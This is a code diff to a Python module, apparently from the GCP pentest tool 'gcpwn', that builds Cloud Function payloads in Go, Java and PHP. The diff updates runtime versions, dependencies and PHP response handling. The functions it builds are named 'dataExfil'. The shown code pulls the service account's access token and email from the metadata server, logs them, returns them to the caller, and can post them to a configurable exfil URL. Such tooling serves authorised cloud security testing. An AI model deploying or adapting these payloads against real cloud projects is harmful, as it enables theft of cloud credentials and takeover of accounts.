@@ -588,7 +588,10 @@ exports.dataExfil = async (req, res) => {{
     return {"index.js": index_js, "package.json": package_json}
 
 
-def _go_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
+def _go_payload(exfil_url: str = "", secret_path: str = "", runtime: str = "go125") -> Dict[str, str]:
+    # go125 → "1.25", go124 → "1.24", etc.
+    _ver = runtime.lstrip("go")
+    go_ver = f"{_ver[:-2]}.{_ver[-2:]}" if len(_ver) == 3 else f"1.{_ver[-2:]}"
     consts = ""
     if secret_path:
         consts += f'const _SECRET_PATH = {json.dumps(secret_path)}\n'
@@ -658,11 +661,12 @@ func DataExfil(w http.ResponseWriter, r *http.Request) {{
 \tjson.NewEncoder(w).Encode(map[string]interface{{}}{{"email": email, "access_token": accessToken}})
 }}
 """
-    go_mod = "module gcpwn.local/cf\n\ngo 1.22\n"
+    go_mod = f"module gcpwn.local/cf\n\ngo {go_ver}\n"
     return {"function.go": function_go, "go.mod": go_mod}
 
 
-def _java_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
+def _java_payload(exfil_url: str = "", secret_path: str = "", runtime: str = "java25") -> Dict[str, str]:
+    java_ver = runtime.lstrip("java")  # "java25" → "25"
     path_check = ""
     if secret_path:
         path_check = (
@@ -736,7 +740,7 @@ public class DataExfil implements HttpFunction {{
     }}
 }}
 """
-    pom_xml = """\
+    pom_xml = f"""\
 <?xml version="1.0" encoding="UTF-8"?>
 <project xmlns="http://maven.apache.org/POM/4.0.0"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -746,14 +750,14 @@ public class DataExfil implements HttpFunction {{
   <artifactId>data-exfil</artifactId>
   <version>1.0.0</version>
   <properties>
-    <maven.compiler.source>21</maven.compiler.source>
-    <maven.compiler.target>21</maven.compiler.target>
+    <maven.compiler.source>{java_ver}</maven.compiler.source>
+    <maven.compiler.target>{java_ver}</maven.compiler.target>
   </properties>
   <dependencies>
     <dependency>
       <groupId>com.google.cloud.functions</groupId>
       <artifactId>functions-framework-api</artifactId>
-      <version>1.1.0</version>
+      <version>1.1.4</version>
       <scope>provided</scope>
     </dependency>
   </dependencies>
@@ -870,9 +874,8 @@ def _php_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
     path_check = ""
     if secret_path:
         path_check = (
-            f'    $reqPath = $request->getUri()->getPath();\n'
-            f'    if ($reqPath !== {repr(secret_path)}) {{\n'
-            f'        return new \\GuzzleHttp\\Psr7\\Response(404);\n'
+            f'    if ($request->getUri()->getPath() !== {repr(secret_path)}) {{\n'
+            f'        return new Response(404);\n'
             f'    }}\n'
         )
     callback_code = ""
@@ -887,7 +890,9 @@ def _php_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
     index_php = f"""\
 <?php
 use Google\\CloudFunctions\\FunctionsFramework;
+use GuzzleHttp\\Psr7\\Response;
 use Psr\\Http\\Message\\ServerRequestInterface;
+use Psr\\Http\\Message\\ResponseInterface;
 
 FunctionsFramework::http('dataExfil', 'dataExfil');
 
@@ -899,7 +904,7 @@ function fetchMeta(string $path): string {{
     );
 }}
 
-function dataExfil(ServerRequestInterface $request): string {{
+function dataExfil(ServerRequestInterface $request): ResponseInterface {{
 {path_check}\
     $tokenData = json_decode(fetchMeta('token'), true);
     $accessToken = $tokenData['access_token'] ?? '';
@@ -907,11 +912,11 @@ function dataExfil(ServerRequestInterface $request): string {{
     error_log('GCPWN_CF_EMAIL=' . $email);
     error_log('GCPWN_CF_TOKEN=' . $accessToken);
 {callback_code}\
-    header('Content-Type: application/json');
-    return json_encode(['email' => $email, 'access_token' => $accessToken]);
+    return new Response(200, ['Content-Type' => 'application/json'],
+        json_encode(['email' => $email, 'access_token' => $accessToken]));
 }}
 """
-    composer = '{"require":{"google/cloud-functions-framework":"^1.2"}}'
+    composer = '{"require":{"google/cloud-functions-framework":"^1.4"}}'
     return {"index.php": index_php, "composer.json": composer}
 
 
@@ -1000,8 +1005,8 @@ def _build_payload_zip(exfil_url: str = "", secret_path: str = "", runtime: str 
         "php":    _php_payload,
         "dotnet": _dotnet_payload,
     }
-    if lang == "dotnet":
-        files = _dotnet_payload(exfil_url=exfil_url, secret_path=secret_path, runtime=runtime)
+    if lang in ("go", "java", "dotnet"):
+        files = builders[lang](exfil_url=exfil_url, secret_path=secret_path, runtime=runtime)
     else:
         files = builders.get(lang, _python_payload)(exfil_url=exfil_url, secret_path=secret_path)
     return _zip_from_files(files)
